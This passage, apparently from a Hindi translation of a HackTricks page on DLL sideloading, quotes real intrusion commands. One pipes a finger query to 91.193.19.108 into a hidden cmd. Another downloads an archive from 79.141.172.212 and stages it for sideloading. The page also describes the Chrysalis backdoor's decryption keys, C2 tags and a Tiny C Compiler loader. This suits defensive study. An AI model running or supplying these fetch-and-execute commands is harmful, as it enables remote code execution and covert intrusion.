- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` spawn करता है, Finger server से commands खींचता है, और उन्हें `cmd` को pipe करता है:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 पर टेक्स्ट खींचता है; `| cmd` सर्वर के response को execute कर देता है, जिससे operators second stage server-side बदल सकते हैं।

- **Built-in download/extract:** एक benign extension वाली archive डाउनलोड करें, उसे unpack करें, और sideload target व DLL को एक random `%LocalAppData%` फोल्डर के नीचे stage करें:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress छुपाता है और redirects follow करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के माध्यम से शुरू करें ताकि telemetry में एक CIM-created process दिखाई दे जबकि वह colocated DLL लोड कर रहा हो:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- यह उन binaries के साथ काम करता है जो local DLLs को प्राथमिकता देते हैं (उदा., `intelbq.exe`, `nearby_share.exe`); payload (उदा., Remcos) trusted नाम के तहत चलेगा।

- **Hunting:** जब `forfiles` में `/p`, `/m`, और `/c` एक साथ दिखें तो अलर्ट करें; admin scripts के बाहर यह असामान्य होता है।


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

हाल ही में Lotus Blossom intrusion ने एक trusted update chain का दुरुपयोग कर NSIS-packed dropper पहुंचाया जिसने DLL sideload और पूरी तरह in-memory payloads स्टेज किए।

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, उसे **HIDDEN** चिह्नित करता है, renamed Bitdefender Submission Wizard `BluetoothService.exe`, एक malicious `log.dll`, और एक encrypted blob `BluetoothService` drop करता है, फिर EXE लॉन्च करता है।
- Host EXE `log.dll` को import करता है और `LogInit`/`LogWrite` को कॉल करता है। `LogInit` blob को mmap-load करता है; `LogWrite` उसे custom LCG-based stream से decrypt करता है (constants **0x19660D** / **0x3C6EF35F**, key material पहले के hash से निकला), buffer को plaintext shellcode से overwrite करता है, temps free करता है, और उस पर jump कर देता है।
- IAT से बचने के लिए loader APIs को export names को hash करके resolve करता है, FNV-1a basis **0x811C9DC5** + prime **0x1000193** का उपयोग करता है, फिर एक Murmur-style avalanche (**0x85EBCA6B**) apply करता है और salted target hashes से compare करता है।

Main shellcode (Chrysalis)
- मुख्य module को add/XOR/sub दोहराकर key `gQ2JR&9;` के साथ पाँच पास में decrypt करता है, फिर dynamically `Kernel32.dll` → `GetProcAddress` लोड करके import resolution पूरा करता है।
- रनटाइम पर per-character bit-rotate/XOR transforms के माध्यम से DLL नाम strings फिर reconstruct करता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` लोड करता है।
- एक दूसरा resolver PEB → InMemoryOrderModuleList को वॉक करके काम करता है, प्रत्येक export table को 4-байт ब्लॉक्स में Murmur-style mixing के साथ पार्स करता है, और केवल तब `GetProcAddress` पर fallback करता है जब hash नहीं मिलती।

Embedded configuration & C2
- Configuration drop किए गए `BluetoothService` फाइल के अंदर **offset 0x30808** पर रहती है (size **0x980**) और यह RC4 से decrypt होती है key `qwhvb^435h&*7` से, जो C2 URL और User-Agent प्रकट करता है।
- Beacons एक dot-delimited host profile बनाते हैं, tag `4Q` prepend करते हैं, फिर key `vAuig34%^325hGV` से RC4-encrypt कर के `HttpSendRequestA` पर HTTPS के माध्यम से भेजते हैं। Responses RC4-decrypt हो कर tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases) द्वारा dispatch होते हैं।
- Execution mode CLI args से gated है: कोई args नहीं = persistence install (service/Run key) जो `-i` को point करती है; `-i` self को `-k` के साथ relaunch करता है; `-k` install skip कर payload चलाता है।

Alternate loader observed
- उसी intrusion ने Tiny C Compiler drop किया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` execute किया, जिसके साथ `libtcc.dll` रखा गया था। attacker-supplied C source में embedded shellcode था, जो compile करके in-memory चलाया गया बिना PE के डिस्क को छुए। नकल करने के लिए:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- यह TCC-based compile-and-run stage ने runtime पर `Wininet.dll` को import किया और एक hardcoded URL से second-stage shellcode को pull किया, जिससे एक flexible loader बना जो compiler run के रूप में छद्मवेश करता है।

## संदर्भ

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
